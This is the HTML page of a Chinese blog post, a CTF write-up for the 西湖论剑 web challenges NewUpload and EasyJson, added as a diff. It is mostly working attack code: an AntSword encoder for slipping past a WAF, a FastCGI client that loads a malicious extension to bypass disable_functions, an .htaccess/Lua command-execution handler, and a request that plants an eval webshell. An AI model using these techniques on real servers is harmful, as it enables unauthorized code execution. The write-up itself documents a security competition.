@@ -1,0 +1,649 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>西湖论剑 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="西湖论剑">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-08 22:18" pubdate>
+        2020年10月8日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      20
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">西湖论剑</h1>
+            
+            <div class="markdown-body">
+              <h2 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h2><p>前面上传带%就可以绕，上马后有宝塔的waf，三次url编码后就可以正常传东西（比如phpinfo();</p>
+<p>三次url编码后怎么连蚁剑，这就要写编码器了</p>
+<pre><code class="hljs javascript"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * php::base64编码器</span>
+<span class="hljs-comment"> * Create at: 2020/10/08 11:13:29</span>
+<span class="hljs-comment"> */</span>
+
+<span class="hljs-meta">&#x27;use strict&#x27;</span>;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">* @param  &#123;String&#125; pwd   连接密码</span>
+<span class="hljs-comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span>
+<span class="hljs-comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span>
+<span class="hljs-comment">*/</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">forceEncode</span>(<span class="hljs-params">s</span>) </span>&#123;
+  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(s).map(<span class="hljs-function"><span class="hljs-params">i</span>=&gt;</span><span class="hljs-string">&#x27;%&#x27;</span>+i.charCodeAt(<span class="hljs-number">0</span>).toString(<span class="hljs-number">16</span>).padStart(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>)).join(<span class="hljs-string">&#x27;&#x27;</span>)
+&#125;
+
+<span class="hljs-built_in">module</span>.exports = <span class="hljs-function">(<span class="hljs-params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;
+  <span class="hljs-keyword">const</span> payload = data[<span class="hljs-string">&#x27;_&#x27;</span>]
+  data[pwd] = forceEncode(forceEncode(forceEncode(payload)));
+  <span class="hljs-keyword">delete</span> data[<span class="hljs-string">&#x27;_&#x27;</span>];
+  <span class="hljs-built_in">console</span>.log(data);
+  <span class="hljs-keyword">return</span> data;
+&#125;</code></pre>
+
+<p>然后可以有两种做法，</p>
+<p>一种是  用于 PHP-FPM、FastCGI 模式下突破 <code>disabled_functions</code></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/ant_php_extension">https://github.com/AntSwordProject/ant_php_extension</a> </p>
+<p><a target="_blank" rel="noopener" href="https://meizjm3i.github.io/2019/06/11/0CTF-TCTF-2019-Web-Writeup/">https://meizjm3i.github.io/2019/06/11/0CTF-TCTF-2019-Web-Writeup/</a></p>
+<p>按照上面链接编译so文件，上传<code>&lt;?php antsystem(&quot;/readflag&quot;); ?&gt;</code> s.php ,上传下面的php访问就可以看到执行的结果</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;
+    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;
+    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;
+    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;
+    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;
+    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;
+    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;
+    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;
+    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;
+    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;
+    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$keepAlive</span> = <span class="hljs-literal">false</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$_requests</span> = <span class="hljs-keyword">array</span>();
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$_requestCounter</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params"><span class="hljs-variable">$type</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$requestId</span> = <span class="hljs-number">1</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$offset</span> = <span class="hljs-number">0</span>;
+        <span class="hljs-variable">$totLen</span> = strlen(<span class="hljs-variable">$content</span>);
+        <span class="hljs-variable">$buf</span>    = <span class="hljs-string">&#x27;&#x27;</span>;
+        <span class="hljs-keyword">do</span> &#123;
+            <span class="hljs-comment">// Packets can be a maximum of 65535 bytes</span>
+            <span class="hljs-variable">$part</span> = substr(<span class="hljs-variable">$content</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-number">0xffff</span> - <span class="hljs-number">8</span>);
+            <span class="hljs-variable">$segLen</span> = strlen(<span class="hljs-variable">$part</span>);
+            <span class="hljs-variable">$buf</span> .= chr(<span class="hljs-built_in">self</span>::VERSION_1)        <span class="hljs-comment">/* version */</span>
+                . chr(<span class="hljs-variable">$type</span>)                    <span class="hljs-comment">/* type */</span>
+                . chr((<span class="hljs-variable">$requestId</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span>
+                . chr(<span class="hljs-variable">$requestId</span> &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span>
+                . chr((<span class="hljs-variable">$segLen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)    <span class="hljs-comment">/* contentLengthB1 */</span>
+                . chr(<span class="hljs-variable">$segLen</span> &amp; <span class="hljs-number">0xFF</span>)           <span class="hljs-comment">/* contentLengthB0 */</span>
+                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span>
+                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span>
+                . <span class="hljs-variable">$part</span>;                        <span class="hljs-comment">/* content */</span>
+            <span class="hljs-variable">$offset</span> += <span class="hljs-variable">$segLen</span>;
+        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-variable">$offset</span> &lt; <span class="hljs-variable">$totLen</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$buf</span>;
+    &#125;
+    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-variable">$nlen</span> = strlen(<span class="hljs-variable">$name</span>);
+        <span class="hljs-variable">$vlen</span> = strlen(<span class="hljs-variable">$value</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &lt; <span class="hljs-number">128</span>) &#123;
+            <span class="hljs-comment">/* nameLengthB0 */</span>
+            <span class="hljs-variable">$nvpair</span> = chr(<span class="hljs-variable">$nlen</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
+            <span class="hljs-variable">$nvpair</span> = chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$nlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0xFF</span>);
+        &#125;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &lt; <span class="hljs-number">128</span>) &#123;
+            <span class="hljs-comment">/* valueLengthB0 */</span>
+            <span class="hljs-variable">$nvpair</span> .= chr(<span class="hljs-variable">$vlen</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
+            <span class="hljs-variable">$nvpair</span> .= chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr((<span class="hljs-variable">$vlen</span> &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(<span class="hljs-variable">$vlen</span> &amp; <span class="hljs-number">0xFF</span>);
+        &#125;
+        <span class="hljs-comment">/* nameData &amp; valueData */</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$nvpair</span> . <span class="hljs-variable">$name</span> . <span class="hljs-variable">$value</span>;
+    &#125;
+    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>, <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$length</span> === <span class="hljs-literal">null</span>) &#123;
+            <span class="hljs-variable">$length</span> = strlen(<span class="hljs-variable">$data</span>);
+        &#125;
+        <span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();
+        <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;
+        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$p</span> != <span class="hljs-variable">$length</span>) &#123;
+            <span class="hljs-variable">$nlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$nlen</span> &gt;= <span class="hljs-number">128</span>) &#123;
+                <span class="hljs-variable">$nlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);
+                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);
+                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);
+                <span class="hljs-variable">$nlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));
+            &#125;
+            <span class="hljs-variable">$vlen</span> = ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;);
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$vlen</span> &gt;= <span class="hljs-number">128</span>) &#123;
+                <span class="hljs-variable">$vlen</span> = (<span class="hljs-variable">$nlen</span> &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);
+                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">16</span>);
+                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;) &lt;&lt; <span class="hljs-number">8</span>);
+                <span class="hljs-variable">$vlen</span> |= (ord(<span class="hljs-variable">$data</span>&#123;<span class="hljs-variable">$p</span>++&#125;));
+            &#125;
+            <span class="hljs-variable">$array</span>[substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$nlen</span>)] = substr(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$p</span>+<span class="hljs-variable">$nlen</span>, <span class="hljs-variable">$vlen</span>);
+            <span class="hljs-variable">$p</span> += (<span class="hljs-variable">$nlen</span> + <span class="hljs-variable">$vlen</span>);
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$array</span>;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildAllPacket</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$params</span>, <span class="hljs-variable">$stdin</span></span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-comment">// Ensure new requestID is not already being tracked</span>
+        <span class="hljs-keyword">do</span> &#123;
+            <span class="hljs-keyword">$this</span>-&gt;_requestCounter++;
+            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_requestCounter &gt;= <span class="hljs-number">65536</span> <span class="hljs-comment">/* or (1 &lt;&lt; 16) */</span>) &#123;
+                <span class="hljs-keyword">$this</span>-&gt;_requestCounter = <span class="hljs-number">1</span>;
+            &#125;
+            <span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;_requestCounter;
+        &#125; <span class="hljs-keyword">while</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;_requests[<span class="hljs-variable">$id</span>]));
+        <span class="hljs-variable">$request</span> = <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::BEGIN_REQUEST, chr(<span class="hljs-number">0</span>) . chr(<span class="hljs-built_in">self</span>::RESPONDER) . chr((<span class="hljs-keyword">int</span>) <span class="hljs-keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="hljs-number">0</span>), <span class="hljs-number">5</span>), <span class="hljs-variable">$id</span>);
+        <span class="hljs-variable">$paramsRequest</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$params</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
+            <span class="hljs-variable">$paramsRequest</span> .= <span class="hljs-keyword">$this</span>-&gt;buildNvpair(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$id</span>);
+        &#125;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$paramsRequest</span>) &#123;
+            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-variable">$paramsRequest</span>, <span class="hljs-variable">$id</span>);
+        &#125;
+        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$id</span>);
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stdin</span>) &#123;
+            <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-variable">$stdin</span>, <span class="hljs-variable">$id</span>);
+        &#125;
+        <span class="hljs-variable">$request</span> .= <span class="hljs-keyword">$this</span>-&gt;buildPacket(<span class="hljs-built_in">self</span>::STDIN, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$id</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$request</span>;
+    &#125;
+&#125;
+<span class="hljs-variable">$sock</span> = stream_socket_client(<span class="hljs-string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>);
+<span class="hljs-variable">$client</span> = <span class="hljs-keyword">new</span> Client();
+<span class="hljs-variable">$payload_file</span> = <span class="hljs-string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;
+<span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(
+    <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,
+    <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; <span class="hljs-variable">$payload_file</span>,
+    <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="hljs-string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,
+    <span class="hljs-comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span>
+);
+<span class="hljs-variable">$data</span> = <span class="hljs-variable">$client</span>-&gt;buildAllPacket(<span class="hljs-variable">$params</span>, <span class="hljs-string">&#x27;&#x27;</span>);
+fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$data</span>);
+var_dump(fread(<span class="hljs-variable">$sock</span>, <span class="hljs-number">4096</span>));
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+
+
+<p>另一种是lau脚本执行</p>
+<pre><code class="hljs lua">上传.htaccess  AddHandler lua-script .lua
+
+上传.lua
+<span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span>
+    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span>
+    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)
+    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)
+    r:puts(a)
+
+    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span>
+        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span>
+            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )
+        <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">else</span>
+        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)
+    <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span></code></pre>
+
+
+
+<h2 id="EasyJson"><a href="#EasyJson" class="headerlink" title="EasyJson"></a>EasyJson</h2><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?action=write&amp;source=1&amp;filename=%61%2e%70%68%70</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: easyjson.f40fea.challenge.gcsis.cn
+<span class="hljs-attribute">Content-Length</span>: 195
+<span class="hljs-attribute">Cache-Control</span>: max-age=0
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+<span class="hljs-attribute">Origin</span>: http://easyjson.f40fea.challenge.gcsis.cn
+<span class="hljs-attribute">Content-Type</span>: application/json
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+<span class="hljs-attribute">Referer</span>: http://easyjson.f40fea.challenge.gcsis.cn/?action=write&amp;source=1&amp;filename=1
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8
+<span class="hljs-attribute">Connection</span>: close
+
+&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;
+</code></pre>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">西湖论剑</a>
+                    
+                      <a class="hover-with-bg" href="/tags/FastCGI/">FastCGI</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/17/N1CTF-2020/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">N1CTF 2020</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/08/12/pwnhub-image-convert/">
+                        <span class="hidden-mobile">pwnhub image_convert</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
